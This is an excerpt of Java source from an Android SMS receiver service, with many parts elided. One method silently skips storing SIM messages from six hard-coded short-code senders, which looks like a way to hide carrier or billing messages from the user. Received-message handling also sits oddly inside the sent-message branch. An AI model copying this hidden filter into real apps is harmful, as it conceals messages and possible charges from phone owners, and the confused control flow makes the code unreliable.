...
//        }
            ...
            if (intent != null) {
                ...
                if (MESSAGE_SENT_ACTION.equals(intent.getAction())) {
                    handleSmsSent(intent, error);
						      ...
						      int IsComefromdispatchPdusOnIcc = intent.getIntExtra("dispatchPdusOnIcc", 0); 
                	if (IsComefromdispatchPdusOnIcc == 1)
                    handleSmsOnSimReceived(intent, error);
                  else  
                    handleSmsReceived(intent, error);

                //} else if (SMS_ON_ICC_RECEIVED_ACTION.equals(action)) {
                //    handleSmsOnSimReceived(intent, error);
    ...
    private void handleSmsOnSimReceived(Intent intent, int error)
    {
        //SmsMessage msgs[] = MmsFrameworkInterface.getMessagesFromDualIntent(intent);
        SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
        //Log.v("SmsReceiverService", "CP_COMM: begin handleSmsOnSimReceived... ");
        //NETWORK_TYPE = MmsFrameworkInterface.getPhoneIdByIntent(intent);
        INDEX_ON_SIM = intent.getIntExtra("index", -1);
        READ_STATUS = intent.getIntExtra("status", 0);
        //Log.v("SmsReceiverService", "CP_COMM: begin handleSmsOnSimReceived... INDEX_ON_SIM="+INDEX_ON_SIM);
        String s = msgs[0].getDisplayOriginatingAddress();
        if(!"10659401".equals(s) && !"10659188".equals(s) && !"1065840409".equals(s) && !"10654040".equals(s) && !"10655464".equals(s) && !"10655459".equals(s))
        {
            Uri uri = insertMessageSmsOnSim(this, msgs, error);
            if(Log.isLoggable("Mms:transaction", 2))
            {
                SmsMessage smsmessage = msgs[0];
                StringBuilder stringbuilder = (new StringBuilder()).append("handleSmsReceived");
                String s1;
                if(smsmessage.isReplace())
                    s1 = "(replace)";
                else
                    s1 = "";
                //Log.v("SmsReceiverService", stringbuilder.append(s1).append(" messageUri: ").append(uri).append(", address: ").append(smsmessage.getOriginatingAddress()).append(", body: ").append(smsmessage.getMessageBody()).toString());
            }
            if(uri != null)
            {
                if(READ_STATUS == 0)
                {
                    ...
                    //MmsConfig.mCheckMessageLimit.checkCardStorage();
                    //MmsSmsSettingProvide.notifyPhoneAndCardFull();
                }
                INDEX_ON_SIM = -1;
                READ_STATUS = 0;
            }
            //Log.v("SmsReceiverService", "CP_COMM:end handleSmsOnSimReceived... ");
        }
    }
    ...
    private void handleSmsReceived(Intent intent, int error) {
        ...
        if (Log.isLoggable(LogTag.TRANSACTION, Log.VERBOSE)) {
            ...
            //Log.v(TAG, "handleSmsReceived new flag:" + mIsNewSMS);
        }
    ...
    private Uri insertMessageSmsOnSim(Context context, SmsMessage[] msgs, int error) {
        // Build the helper classes to parse the messages.
        SmsMessage sms = msgs[0];
